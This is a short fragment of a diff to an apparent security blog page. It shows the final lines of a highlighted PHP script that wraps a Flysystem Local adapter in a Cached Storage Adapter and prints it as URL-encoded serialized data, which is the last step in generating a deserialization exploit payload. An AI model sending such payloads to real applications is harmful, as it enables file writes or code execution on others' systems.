+    <span class="token variable">$local</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>Local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">(</span><span class="token variable">$local</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240710144420032.png" alt="image-20240710144420032"></p>
 
         </div>
